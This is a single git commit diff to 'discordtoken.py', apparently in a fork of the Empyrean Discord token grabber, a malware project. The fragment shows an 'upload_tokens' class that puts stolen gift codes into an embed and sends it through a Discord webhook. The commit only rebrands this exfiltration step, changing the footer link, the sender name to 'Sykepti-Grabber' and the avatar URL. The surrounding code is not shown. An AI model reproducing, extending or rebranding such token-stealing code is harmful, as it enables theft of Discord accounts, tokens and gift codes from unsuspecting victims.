5880685d3d2652b921782a51ace962afeb7cecd2
Sykeptical <93049955+Sykeptical@users.noreply.github.com>
2023-01-12 15:07:03 +0300

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="github.com/Sykeptical")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Sykepti-Grabber", avatar_url="https://cdn.discordapp.com/attachments/921112750120390736/1062739533612986410/large.jpg")
